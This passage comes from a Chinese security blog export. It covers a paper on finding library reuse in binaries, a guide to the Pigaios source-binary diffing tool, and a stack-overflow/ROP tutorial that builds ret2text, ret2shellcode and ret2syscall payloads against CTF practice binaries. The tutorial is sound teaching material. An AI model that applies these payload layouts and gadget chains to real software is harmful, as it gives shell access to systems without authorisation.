class="header-anchor">#</a></h3><p>分为单一复用和部分复用两类</p><p>在大多数情况下，匹配分数高判断为复用是正确的，这是最简单的一种，单一复用</p><p>实验中也发现了部分复用的情况，例如libssl（ssleay），只复用了openssl中7.6%的源代码文件，因此匹配分数并不高</p><p>为了识别部分复用的情况，考虑开源项目的代码结构是十分重要的。我们首先将开源项目分解为库模块，并分析编译过程获得库模块和源码的关系，例如openssl编译出来会有libssl和libcrypto两个库模块，称为开源库之间的包含关系。</p><h2><span id="pdesign">Design</span><a href="#pdesign" class="header-anchor">#</a></h2><h3><span id="pselecting-code-feature">Selecting Code Feature</span><a href="#pselecting-code-feature" class="header-anchor">#</a></h3><p>特征选取只要考虑两个影响：1、特征在源码和二进制上都存在；2、编译过程对特征改变不大。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133637.jpg" alt="image-20200511145048120"></p><h3><span id="pmatching-code-features">Matching Code Features</span><a href="#pmatching-code-features" class="header-anchor">#</a></h3><p>将7种特征分为 字符串型、数字型和控制流型，并使用不同的算法进行匹配</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133643.jpg" alt="image-20200511145520328"></p><p><strong>算法：</strong></p><p>字符串型：完全匹配。</p><p>数字型：全局整数/枚举数组作为可搜索的连续比特流存储在二进制文件的数据段中，因此，采用将其编码后直接在.data和.radata中寻找的方法尽心匹配。</p><p>控制流型：基于语义的匹配。例如，对于switch case来说，源码中为<code>[􏰁{0},{9},{16},{17},{20}􏰂]</code>，但二进制中提取到的jump table是<code>􏰁{0},{9},{16},{17},{20},{1,2,3,4,5,6,7,8,10, 11,12,13,14,15,18,19}􏰂</code>，他们是语义等价的。对于if else特征来说，二进制提取的是最长的公共子序列<code>[0x1,0x80,0x800,0x10000,0x200000,0x10]</code>，但源码中为<code>[0x80,0x800,0x10000, 0x200000]</code>，他们也是匹配的，匹配长度为4</p><h3><span id="pdetermining-the-importance-weights-of-feature-instances">Determining the Importance-Weights of Feature Instances</span><a href="#pdetermining-the-importance-weights-of-feature-instances" class="header-anchor">#</a></h3><p>对于一些常见的特征，例如base64的表等，由于其特殊性不够，因此对判断复用哪个库的参考不够大，为了衡量特殊性，我们采用了类TF-IDF的S-IDF方法</p><ul><li><p>For a string-typed feature, we use the number of its substrings, including URLs and copyright information (among others).</p></li><li><p>For an integer-typed feature, the entropy for its bitstream is used.</p></li><li><p>For a control-flow-typed feature, the length of its constant sequence is used.</p></li></ul><p><strong>Computing the Specificity Weights of Bitstreams as Entrophy</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133651.jpg" alt="image-20200511153909084"></p><p><strong>S-IDF for Computing Frequency Weights</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133657.jpg" alt="image-20200511154042185"></p><h3><span id="pcomputing-matching-scores">Computing Matching Scores</span><a href="#pcomputing-matching-scores" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133701.jpg" alt="image-20200511154138803"></p><h3><span id="pidentifying-reuse-types">Identifying Reuse Types</span><a href="#pidentifying-reuse-types" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133706.jpg" alt="image-20200511154259605"></p><p>识别部分复用：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133711.jpg" alt="image-20200511154448598"></p><p>识别递归复用：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133716.jpg" alt="image-20200511154512900"></p><h2><span id="pimplementation">IMPLEMENTATION</span><a href="#pimplementation" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133722.jpg" alt="image-20200511154659189"></p><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>说一下在最近的分析和改进过程中，发现的一些尚需改进的问题：</p><ol><li><p>在一些库中，由于存在大量static函数，一旦优化会产生内联，影响匹配效果。</p></li><li><p>在项目实现上，If else特征部分存在问题，由于比较的是cmp命令，因此在二进制特征提取时，循环中的判断常量也会提取出来，而源码仅提取if else中常量，虽然在比较时采用了最长匹配方法，但实际上仍不够理想。进一步改进可能得先识别循环，从二进制特征中将循环的cmp去除。</p></li></ol>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>源码二进制比对工具Pigaios</title>
    <url>/dc413e13.html</url>
    <content><![CDATA[<h2><span id="ppigaios-yuan-li-jian-jie">Pigaios原理简介</span><a href="#ppigaios-yuan-li-jian-jie" class="header-anchor">#</a></h2><p><strong>目的：</strong> 为了解决符号表问题</p><p><strong>两种方案：</strong></p><ol><li>编译源码，使用 Diaphora (or BinDiff) 导出符号表，导入符号表缺失样本</li><li>从源码题符号表，导入符号表缺失样本</li></ol><p>第二种方法好处在于不需要完全编译，因为对于旧的源码，有的很难编译成功</p><a id="more"></a><h3><span id="pgong-zuo-liu-cheng">工作流程</span><a href="#pgong-zuo-liu-cheng" class="header-anchor">#</a></h3><ul><li>解析源代码，并从每个函数的抽象语法树（AST）中提取信息。</li><li>IDA导入从源代码提取的包含源码信息的数据库。</li><li>查找在C源代码和IDA数据库中找到的函数匹配。</li><li>找到没有误报的初始匹配项后，从调用图中找到更多匹配项。</li><li>使用“专家系统”和“基于机器学习”的系统进行评分。</li><li>同样，将给定代码库的所有结构和枚举导入IDA数据库（这在IDA中并不简单）。</li></ul><h3><span id="pjie-xi-han-shu">解析函数</span><a href="#pjie-xi-han-shu" class="header-anchor">#</a></h3><p>二进制：通过IDA</p><p>源码：通过CLang，提取</p><ul><li>字符串常量</li><li>循环次数、条件判断、函数调用、全局变量</li><li>switch信息</li><li>函数调用信息</li><li>是否为递归函数</li></ul><h3><span id="pte-zheng-pi-pei">特征匹配</span><a href="#pte-zheng-pi-pei" class="header-anchor">#</a></h3><h4><span id="pchang-gui-fang-fa">常规方法</span><a href="#pchang-gui-fang-fa" class="header-anchor">#</a></h4><h5><span id="pwan-quan-pi-pei">完全匹配</span><a href="#pwan-quan-pi-pei" class="header-anchor">#</a></h5><p>首先是百分百匹配：为了达到零误报的目的</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134844.jpg" alt="image-20200501145915448" style="zoom:67%"><p>作者实验结果为在4817个函数中找到了90完全匹配，虽然数目少，但胜在百分百确认，没有误报，不会对分析造成误导。</p><h5><span id="pqi-fa-shi-fang-fa">启发式方法</span><a href="#pqi-fa-shi-fang-fa" class="header-anchor">#</a></h5><p>为了找到更多的匹配，就需要一些启发式信息了</p><p>启发式：</p><ol><li>调用图</li><li>临近函数</li><li>特殊的callee</li><li>少见的常量特征</li></ol><h4><span id="pji-qi-xue-xi-fang-fa">机器学习方法</span><a href="#pji-qi-xue-xi-fang-fa" class="header-anchor">#</a></h4><p>多分类，使用以下算法</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134849.jpg" alt="image-20200501150640570"></p><h3><span id="pzong-he-kao-liang">综合考量</span><a href="#pzong-he-kao-liang" class="header-anchor">#</a></h3><p>当常规算法和ML结果都表现很好时，就说明匹配度very very good，两者可相互印证</p><h2><span id="ppigaios-shi-yong-zhi-bei">Pigaios使用指北</span><a href="#ppigaios-shi-yong-zhi-bei" class="header-anchor">#</a></h2><p>Pigaios是一款源码二进制比对工具，在实际二进制样本分析中，带符号表的样本极其少见，这个时候工具的作用就显现出来了。</p><h3><span id="pan-zhuang">安装</span><a href="#pan-zhuang" class="header-anchor">#</a></h3><p>在提取源码特征的机器（例如ubuntu）上安装依赖如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ apt-get install clang python-clang-5.0 libclang-5.0-dev python-colorama python-sklearn</span><br></pre></td></tr></table></figure><p>在装有IDA的机子上也同时安装以下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pip install clang-5 colorama scikit-learn</span><br></pre></td></tr></table></figure><h3><span id="pyuan-ma-te-zheng-ti-qu-guo-cheng">源码特征提取过程</span><a href="#pyuan-ma-te-zheng-ti-qu-guo-cheng" class="header-anchor">#</a></h3><p>下以<code>https://zlib.net/zlib-1.2.11.tar.gz</code>为例</p><h4><span id="psheng-cheng-xiang-mu-xin-xi-wen-jian">生成项目信息文件</span><a href="#psheng-cheng-xiang-mu-xin-xi-wen-jian" class="header-anchor">#</a></h4><p>在源码根目录下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python &#x2F;path&#x2F;to&#x2F;pigaios&#x2F;srcbindiff.py -create</span><br></pre></td></tr></table></figure><p>默认生成文件<code>sbd.project</code>，内容为CXX，LLVM等配置信息，以及源码信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">####################################################</span><br><span class="line"># Default Source-Binary-Differ project configuration</span><br><span class="line">####################################################</span><br><span class="line">[GENERAL]</span><br><span class="line">includes &#x3D; &#x2F;usr&#x2F;lib&#x2F;llvm-3.8&#x2F;bin&#x2F;..&#x2F;lib&#x2F;clang&#x2F;3.8.0&#x2F;include</span><br><span class="line">inlines &#x3D; 0</span><br><span class="line"></span><br><span class="line">[PROJECT]</span><br><span class="line">cflags &#x3D; -I. -I.&#x2F;include</span><br><span class="line">cxxflags &#x3D; -I. -I.&#x2F;include</span><br><span class="line">export-file &#x3D; zlib-1.2.11.sqlite</span><br><span class="line">export-header &#x3D; zlib-1.2.11-exported.h</span><br><span class="line">export-indent &#x3D; clang-format -i</span><br><span class="line"></span><br><span class="line">[FILES]</span><br><span class="line">contrib&#x2F;masmx64&#x2F;inffas8664.c &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream&#x2F;test.cpp &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream&#x2F;zfstream.cpp &#x3D; 1</span><br><span class="line">contrib&#x2F;testzlib&#x2F;testzlib.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;minizip.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;ioapi.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;iowin32.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;zip.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;miniunz.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;mztools.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;unzip.c &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream2&#x2F;zstream_test.cpp &#x3D; 1</span><br><span class="line">contrib&#x2F;inflate86&#x2F;inffas86.c &#x3D; 1</span><br><span class="line">contrib&#x2F;infback9&#x2F;infback9.c &#x3D; 1</span><br><span class="line">contrib&#x2F;infback9&#x2F;inftree9.c &#x3D; 1</span><br><span class="line">contrib&#x2F;puff&#x2F;pufftest.c &#x3D; 1</span><br><span class="line">contrib&#x2F;puff&#x2F;puff.c &#x3D; 1</span><br><span class="line">contrib&#x2F;untgz&#x2F;untgz.c &#x3D; 1</span><br><span class="line">contrib&#x2F;blast&#x2F;blast.c &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream3&#x2F;test.cc &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream3&#x2F;zfstream.cc &#x3D; 1</span><br><span class="line">examples&#x2F;gzappend.c &#x3D; 1</span><br><span class="line">examples&#x2F;gun.c &#x3D; 1</span><br><span class="line">examples&#x2F;zpipe.c &#x3D; 1</span><br><span class="line">examples&#x2F;gzjoin.c &#x3D; 1</span><br><span class="line">examples&#x2F;fitblk.c &#x3D; 1</span><br><span class="line">examples&#x2F;zran.c &#x3D; 1</span><br><span class="line">examples&#x2F;gzlog.c &#x3D; 1</span><br><span class="line">examples&#x2F;enough.c &#x3D; 1</span><br><span class="line">test&#x2F;minigzip.c &#x3D; 1</span><br><span class="line">test&#x2F;infcover.c &#x3D; 1</span><br><span class="line">test&#x2F;example.c &#x3D; 1</span><br><span class="line">inftrees.c &#x3D; 1</span><br><span class="line">gzlib.c &#x3D; 1</span><br><span class="line">inflate.c &#x3D; 1</span><br><span class="line">adler32.c &#x3D; 1</span><br><span class="line">gzclose.c &#x3D; 1</span><br><span class="line">deflate.c &#x3D; 1</span><br><span class="line">infback.c &#x3D; 1</span><br><span class="line">crc32.c &#x3D; 1</span><br><span class="line">zutil.c &#x3D; 1</span><br><span class="line">inffast.c &#x3D; 1</span><br><span class="line">trees.c &#x3D; 1</span><br><span class="line">uncompr.c &#x3D; 1</span><br><span class="line">gzread.c &#x3D; 1</span><br><span class="line">compress.c &#x3D; 1</span><br><span class="line">gzwrite.c &#x3D; 1</span><br></pre></td></tr></table></figure><p>由于实际上<code>example</code>、<code>test</code>等目录包含的是测试样例，可以选择去除对这些文件的分析</p><h4><span id="pti-qu-yuan-ma-te-zheng">提取源码特征</span><a href="#pti-qu-yuan-ma-te-zheng" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python &#x2F;path&#x2F;to&#x2F;pigaios&#x2F;srcbindiff.py -export</span><br></pre></td></tr></table></figure><p>结果存储在<code>.sqlite</code>文件中，在处理过程中会有库文件缺失，以及一些其他的error和fetal，但是没关系，Pigaios都会处理</p><p>可以简要查看一下存了哪些信息，如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134855.jpg" alt="image-20200501141010098"></p><p>包括调用图信息，常量信息，函数信息，源文件信息</p><p><strong>调用图信息</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134858.jpg" alt="image-20200501141115387"></p><p><strong>常量信息</strong></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134903.jpg" alt="image-20200501141136179"></p><p>都是字符串常量</p><p><strong>函数信息</strong></p><p>巨长，这里以tsv格式给出第94行和第127行两条记录，具体字段如下，提取了条件信息，switchcase信息，调用信息等</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134907.jpg" alt="image-20200501141728005" style="zoom:50%"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">94		44176	inflate	__int64 __fastcall()		289		21	[&quot;invalid block type&quot;, &quot;incorrect data check&quot;, &quot;too many length or distance symbols&quot;, &quot;invalid stored block lengths&quot;, &quot;invalid literal&#x2F;length code&quot;, &quot;unknown compression method&quot;, &quot;incorrect header check&quot;, &quot;header crc mismatch&quot;, &quot;invalid distances set&quot;, &quot;invalid code lengths set&quot;, 595056260442243601, &quot;(I&quot;, &quot;unknown header flags set&quot;, &quot;invalid window size&quot;, &quot;invalid distance too far back&quot;, &quot;invalid distance code&quot;, &quot;incorrect length check&quot;, &quot;invalid literal&#x2F;lengths set&quot;, &quot;invalid bit length repeat&quot;, &quot;invalid code -- missing end-of-block&quot;, &quot;&#96;\u0007&quot;]	1	1	[[31, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]]]	6	22	&#123;&quot;.crc32&quot;: 12, &quot;.adler32&quot;: 4, &quot;inflate_table&quot;: 3, &quot;.memcpy&quot;: 5, &quot;.__stack_chk_fail&quot;: 1, &quot;inflate_fast&quot;: 1&#125;	1	1	0		[&quot;incorrect&quot;, &quot;header&quot;]</span><br><span class="line">127		69776	gz_open	__int64 __fastcall(char *file, int fd)	__int64 __fastcall gz_open(char *file, int fd)	21		4	[18446744073709027328, 524481, &quot;%s&quot;, 524353]	1	1	[[78, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77]]]	6	2	&#123;&quot;.open&quot;: 1, &quot;.lseek64&quot;: 2, &quot;.malloc&quot;: 2, &quot;.snprintf&quot;: 1, &quot;.strlen&quot;: 1, &quot;.free&quot;: 3&#125;	1	0	0</span><br></pre></td></tr></table></figure><p><strong>源文件信息</strong></p><p>不知道为啥是空的</p><h3><span id="pyuan-ma-er-jin-zhi-bi-dui">源码二进制比对</span><a href="#pyuan-ma-er-jin-zhi-bi-dui" class="header-anchor">#</a></h3><p>打开编译好并stripped掉的<code>libz.so.1.2.11</code>，运行pigiaos脚本<code>sourceimp_ids.py</code></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134913.jpg" alt="image-20200501142404896"></p><p>可能因为IDA版本原因，需要在<code>Indent command</code>中去掉<code>-kr</code>选项，匹配结果如下</p><p><strong>Diff pseudo-code</strong></p><p>是将二进制函数反编译并和源码比较，由于颜色原因看不清，可能是因为我的IDA用了黑色主题。</p><p>左侧为二进制函数F5结果，右侧为源码函数。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134918.jpg" alt="image-20200501142837530"></p><p><strong>show match reason</strong></p><p>显示匹配原因</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134925.jpg" alt="image-20200501142941360" style="zoom:50%"><p><strong>import all functions</strong></p><p>不是很好用，有错误导入不进来，应该是IDA版本原因</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134931.jpg" alt="image-20200501143157961" style="zoom:50%"><h4><span id="pzhu-yi">注意</span><a href="#pzhu-yi" class="header-anchor">#</a></h4><p>值得一提的是，从效果来看，strip对匹配结果影响很大，当未stripped时，可以获得31条匹配结果</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134936.jpg" alt="image-20200501143719326"></p><p>而当stripped时，只有18个匹配结果</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134942.jpg" alt="image-20200501142607993"></p><p>但前面也提到，Pigaios的主要目的是低误报率，避免误导分析人员，所以也是一个不错的工具</p><h3><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h3><ul><li><a href="https://github.com/joxeankoret/pigaios" target="_blank" rel="noopener">Pigaios源码</a></li></ul>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出与ROP分析与利用</title>
    <url>/1fd25de4.html</url>
    <content><![CDATA[<h2><span id="pji-chu-zhi-shi">基础知识</span><a href="#pji-chu-zhi-shi" class="header-anchor">#</a></h2><h3><span id="pzhan-yi-chu-yu-rop">栈溢出与ROP</span><a href="#pzhan-yi-chu-yu-rop" class="header-anchor">#</a></h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。栈溢出漏洞就是由于栈溢出而导致的漏洞。在程序执行过程中，常使用栈帧记录程序执行过程中的状态，在栈帧中保存着返回地址，当利用栈溢出漏洞修改函数返回地址跳转到非预期地址执行时，就产生了ROP攻击，又称返回导向编程。</p><a id="more"></a><h3><span id="pcheng-xu-diao-yong-zhan">程序调用栈</span><a href="#pcheng-xu-diao-yong-zhan" class="header-anchor">#</a></h3><p>栈帧是记录程序执行过程中状态的结构。在cdecl调用约定中，当程序P调用Q时，会出现以下行为：</p><ol><li>P将Q需要的参数保存到栈或者约定寄存器中，再将Q的返回地址存入栈；</li><li>Q在栈中保存当前esp/rsp寄存器中的值，再将ebp/rbp寄存器中值赋值给esp/rsp寄存器形成栈帧；</li><li>Q申请的局部变量需要的栈空间；</li><li>当Q执行完毕，使用栈中保存的esp/rsp值恢复给esp/rsp寄存器；</li><li>从栈中取出返回地址，跳转回P中继续执行；</li></ol><p>正是因为存在程序调用栈，当出现栈溢出漏洞时，我们能够对返回地址进行劫持，修改程序默认执行路径，达到自己的目的。</p><h2><span id="pchang-jian-bao-hu-ji-zhi">常见保护机制</span><a href="#pchang-jian-bao-hu-ji-zhi" class="header-anchor">#</a></h2><p>在栈溢出漏洞攻防博弈中，程序的保护机制十分重要。对白客来说，通过添加程序保护机制，能够提高漏洞利用的门槛，一定程度上防止程序漏洞被利用；而对于黑客来说，熟悉程序保护机制，能够在漏洞利用过程中少走弯路，提高漏洞利用的效率。</p><p>图2.1所示是使用checksec工具检查linux系统中sh二进制文件的结果。可以看到它启用了RELRO、Canary、NX、PIE和FORTIFY保护。其中Canary、NX和PIE这三种在实际利用中较为常见且有用。其中Canary 和NX在Windows系统中也有类似的保护机制。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132946.jpg" alt="img"></p><center>图2.1 linux下sh中存在的保护机制</center><h3><span id="pnx-yu-dep">NX与DEP</span><a href="#pnx-yu-dep" class="header-anchor">#</a></h3><p>NX是No eXcute的缩写，意为不可执行保护，在Windows系统中为DEP保护。其根本原理如图2.2所示，黑客需要利用漏洞劫持返回地址到某个位置执行，而这一保护将区域置为不可执行，当跳转到该区域内时，检测到异常，触发异常处理并退出程序，使得劫持失效。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132952.jpg" alt="img"></p><center>图2.2 NX/DEP原理</center><h3><span id="pcanary-yu-gs">Canary与GS</span><a href="#pcanary-yu-gs" class="header-anchor">#</a></h3><p>Linux下的Canary保护对应Windows下的GS保护。利用栈溢出是线性连续的覆盖栈内的数据这一特性，在返回地址前插入一个随机的不可预测值，并在函数返回时检查是否被修改，如果被修改，则一定产生了栈溢出，此时会退出程序执行。如图2.3所示，是x86下的Canary保护时栈内布局示意图。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132959.jpg" alt="img"></p><center>图2.3 Canary/GS保护栈布局图</center><h3><span id="ppie-yu-aslr">PIE与ASLR</span><a href="#ppie-yu-aslr" class="header-anchor">#</a></h3><p>PIE是编译过程中的选项，是位置独立的可执行区域的意思。当操作系统开启ASLR（内存地址随机化）时，会打乱二进制文件加载的基址，使得返回地址随机，即使动态调试中EXP通过，但远程攻击时也会由于地址随机化机制失效。操作系统中ASLR存在3个可选项，如下：</p><ul><li>值为0：无随机化，堆栈地址每次都相同</li><li>值为1：随机化出了堆基址以外的所有加载基址</li><li>值为2：随机化所有加载基址（包括堆）</li></ul><h2><span id="prop-fen-xi-yu-li-yong">ROP分析与利用</span><a href="#prop-fen-xi-yu-li-yong" class="header-anchor">#</a></h2><p>ROP，又称返回导向编程，利用程序指令集中存在的ret指令，改变指令流的执行顺序。其利用条件为：</p><ol><li>程序存在溢出且能够控制返回地址；</li><li>可以找到满足条件的gadgets和gadgets地址。</li></ol><p>基本的分类如下：ret2text、ret2shellcode、ret2syscall、ret2libc。</p><p>注：以下分析与利用都为32位程序，示例二进制文件来源于<a href="http://ctfwiki.ycdxsb.cn/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">ctfwiki</a>。</p><h3><span id="pret2text">ret2text</span><a href="#pret2text" class="header-anchor">#</a></h3><p>ret2text是指返回到程序中text段已有的代码中执行。</p><p>分析与利用步骤： 以附件中的ret2text程序为例</p><ol><li>checksec查看保护结果如图3.1.1所示，能够看到没有开启保护。</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133007.jpg" alt="img"></p><center>图3.1.1 checksec查看ret2text结果</center>2. 使用IDA查看ret2text main函数如图3.1.2所示，能够看到存在栈溢出漏洞，由于gets函数未判断读入长度，能使用读入的字符串写入s覆盖到main函数返回地址。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133014.jpg" alt="img"></p><center>图3.1.2 ret2text main函数</center>3. 在secure函数中寻找到system(“/bin/sh”)，如图3.1.3<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133020.jpg" alt="img"></p><center>图3.1.3 secure函数</center>4. 通过输入对栈进行布局。由于未开启保护，我们能直接找到调用system(“/bin/sh”)的指令地址system_binsh_addr，因此我们通过栈溢出布置栈布局如图3.1.4所示，栈溢出首先需要覆盖旧的ebp值，进而覆盖到返回地址，将其修改为system_binsh_addr的地址即可。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133026.jpg" alt="img"></p><center>图3.1.4 ret2text栈布局</center>5. 最后我们需要确定填入的padding长度，使得正好溢出到我们需要的位置，通过gdb和其插件动态调试可以获得，如图3.1.5调试信息可知，padding长度为108。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133033.jpg" alt="img"></p><center>图3.1.5 gdb调试padding长度</center>6. 确定输入，由以上信息我们就能构造最后的输入，为108*’A’+p32(0xdeadbeaf)+p32(system_binsh_addr)。<h3><span id="pret2shellcode">ret2shellcode</span><a href="#pret2shellcode" class="header-anchor">#</a></h3><p>shellcode是能让黑客获得shell的16进制机器码，当text段没有能获取shell的代码时，就需要我们自己想办法将shellcode放入内存中了。各种条件下的shellcode可以参考<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">shellstorm</a>获得。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133040.jpg" alt="img"></p><center>图3.2.1 16进制shellcode</center>图3.2.1是一段16进制shellcode，对应的汇编代码如图3.2.2 所示。可以看到是将字符串/bin/sh\x00存入，再通过系统调用好获取shell。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133046.jpg" alt="img"></p><center>图3.2.2 shellcode汇编代码</center>分析与利用步骤：以附件中的ret2shellcode文件为例<ol><li>checksec查看程序保护机制，如图3.2.3所示，没有开启。</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133051.jpg" alt="img"></p><center>图3.2.3 ret2shellcode 保护机制</center>2. 使用IDA查看main函数如图3.2.4所示，可以看到gets存在栈溢出问题，并且将s内容放到了.bss段的buf2内。由于.bss段具有可执行权限，所以我们可以将shellcode输入存在buf2中，再修改返回地址到buf2处执行。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133056.jpg" alt="img"></p><center>图3.2.4 ret2shellcode main函数</center>3. 通过输入对栈布局如图3.2.5所示，由于存在拷贝，会将shellcode拷贝到buf2，再跳转到buf2执行shellcode即可。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133101.jpg" alt="img"></p><center>图3.2.5 ret2shellcode栈布局</center>4. 同ret2text一样确定padding长度为108。<ol start="5"><li>构造输入为shellcode+(108-len(shellcode))+p32(0xdeadbeaf)+p32(buf2)即可。</li></ol><h3><span id="pret2syscall">ret2syscall</span><a href="#pret2syscall" class="header-anchor">#</a></h3><p>ret2syscall是指返回到系统调用执行。例如执行execve(‘/bin/sh’,0,0)获取shell。通过系统调用号，来调用系统函数，不使用libc中的函数，更加底层。在利用过程中，首先通过栈溢出和gadgets将寄存器置为需要的值，再使用int 0x80进行系统调用。</p><p>图3.3.1所示是execve(‘/bin/sh‘,0,0)对应汇编代码。可以看到从栈中取出了参数放入对应的寄存器，寄存器edx置0，ecx置0，ebx置为’/bin/sh’地址，在eax中存入系统调用号0xb。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133106.jpg" alt="img"></p><center>图3.3.1 execve获取shell的汇编代码</center>分析与利用步骤：以附件中的retsyscall程序为例<ol><li>checksec查看保护如图3.3.2 所示，未开启保护。</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133118.jpg" alt="img"></p><center>图3.3.2 ret2syscall保护机制</center>2. IDA打开查看main函数如图3.3.3所示，存在栈溢出。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133123.jpg" alt="img"></p><center>图3.3.3 ret2syscall main函数</center>3. 通过ROPgadgets工具能找到修改寄存器值，int 0x80，/bin/sh的gadgets地址如图3.3.4所示。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133128.jpg" alt="img"></p><center>图3.3.4 ret2syscall gadgets</center>4. 通过gadgets和栈溢出，就能构造栈布局进行利用了，如图3.3.5所示。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133133.jpg" alt="img"></p><center>图3.3.5 ret2syscall 栈布局</center>当函数返回时，首先会利用两个pop的gadgets及栈中数据，修改eax、ebx、ecx、edx寄存器的值，最后执行int 0x80，就能获得shell了。<ol start="5"><li>padding长度依旧为108，构造输入为</li></ol><p>108*’A’+p32(0xdeadbeaf)+p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(binsh_address)+p32(int_0x80_addr)即可。</p><h3><span id="pret2libc">ret2libc</span><a href="#pret2libc" 